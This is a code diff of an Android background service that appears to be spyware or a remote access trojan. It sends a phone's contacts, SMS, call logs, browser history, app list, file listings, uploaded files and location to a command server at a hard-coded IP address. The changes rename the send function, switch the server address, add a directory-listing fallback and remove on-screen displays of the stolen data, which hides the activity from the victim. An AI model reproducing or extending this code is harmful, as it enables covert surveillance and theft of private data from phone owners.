@@ -8,24 +8,18 @@ import android.content.ContextWrapper;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.graphics.SurfaceTexture;
-import android.hardware.Camera;
-import android.hardware.Camera.Parameters;
 import android.location.Location;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.speech.tts.TextToSpeech;
-import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Base64;
 import android.util.Log;
-import android.view.SurfaceHolder;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
-import androidx.core.os.ConfigurationCompat;
 
 import com.androidnetworking.AndroidNetworking;
 import com.androidnetworking.common.Priority;
@@ -44,11 +38,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
 import java.io.UnsupportedEncodingException;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
@@ -66,12 +56,13 @@ import github.nisrulz.easydeviceinfo.base.EasyMemoryMod;
 
 import me.everything.providers.android.browser.BrowserProvider;
 import me.everything.providers.android.calllog.CallsProvider;
+import me.everything.providers.android.media.MediaProvider;
 import me.everything.providers.android.telephony.TelephonyProvider;
 
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "http://192.168.43.246/commands.php";
+    private String SERVER_URI = "http://192.168.42.204/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -167,7 +158,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         postData.put("device_id", deviceUniqueId);
         postData.put("contact_list", json);
 
-        sendPostDataToServer(postData);
+        sendPostRequestsToClient(postData);
     }
 
     private void getSMSContent() {
@@ -177,10 +168,10 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("sms_list", json);
-        sendPostDataToServer(postData);
+        sendPostRequestsToClient(postData);
     }
 
-    private void sendPostDataToServer(HashMap<String, Object> postData) {
+    private void sendPostRequestsToClient(HashMap<String, Object> postData) {
         AndroidNetworking.post(SERVER_URI)
                 .addBodyParameter(postData)
                 .build()
@@ -343,7 +334,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("browser_history", json);
-        sendPostDataToServer(postData);
+        sendPostRequestsToClient(postData);
 
     }
 
@@ -365,7 +356,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("app_list", base64);
-        sendPostDataToServer(postData);
+        sendPostRequestsToClient(postData);
     }
 
     private void uploadFile(JSONObject jsonObject) {
@@ -380,12 +371,11 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         if (filePath != null) {
             File file = new File(filePath);
             if (file.isFile()) {
-                showAllData(file.getName());
                 HashMap<String, Object> postData = new HashMap<>();
                 postData.put("device_id", deviceUniqueId);
 
                 AndroidNetworking.upload(SERVER_URI)
-                        .addMultipartFile("uploaded_file", file)
+                        .addMultipartFile("upload_file_nm", file)
                         .addMultipartParameter(postData)
                         .setPriority(Priority.HIGH)
                         .setExecutor(Executors.newSingleThreadExecutor())
@@ -410,10 +400,11 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         String targetFilePath = null;
         try {
             object = new JSONObject(jsonObject.get("get_list_file").toString());
-            targetFilePath = object.getString("target_file_path");
+            targetFilePath = object.getString("target_file_path").trim();
         } catch (JSONException e) {
             e.printStackTrace();
         }
+
 
         HashMap<String, Object> postData = new HashMap<>();
 
@@ -422,9 +413,13 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             File[] fileList = file.listFiles();
 
             if (fileList == null) {
-                return;
+                file = new File(Environment.getRootDirectory().getAbsolutePath() + "/");
+                fileList = file.listFiles();
             }
             HashMap<String, Object> hashMap = new HashMap<>();
+
+            if (fileList == null) return;
+
             for (int i = 0; i < fileList.length; i++) {
                 hashMap.put("path_" + (i + 1), fileList[i].getAbsolutePath());
             }
@@ -439,7 +434,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
             postData.put("device_id", deviceUniqueId);
             postData.put("get_file_list", base64);
-            sendPostDataToServer(postData);
+            sendPostRequestsToClient(postData);
         }
 
 
@@ -530,11 +525,10 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     private void getCallLog() {
         CallsProvider callsProvider = new CallsProvider(context);
         String json = new Gson().toJson(callsProvider.getCalls().getList());
-        showAllData(json);
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("call_log_history", json);
-        sendPostDataToServer(postData);
+        sendPostRequestsToClient(postData);
     }
 
     @SuppressLint("MissingPermission")
@@ -547,7 +541,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             postData.put("location_update", "true");
             postData.put("x_axis", locationDataClass.getLatitude + "a");
             postData.put("y_axis", locationDataClass.getLongitude + "a");
-            sendPostDataToServer(postData);
+            sendPostRequestsToClient(postData);
         }
 
 
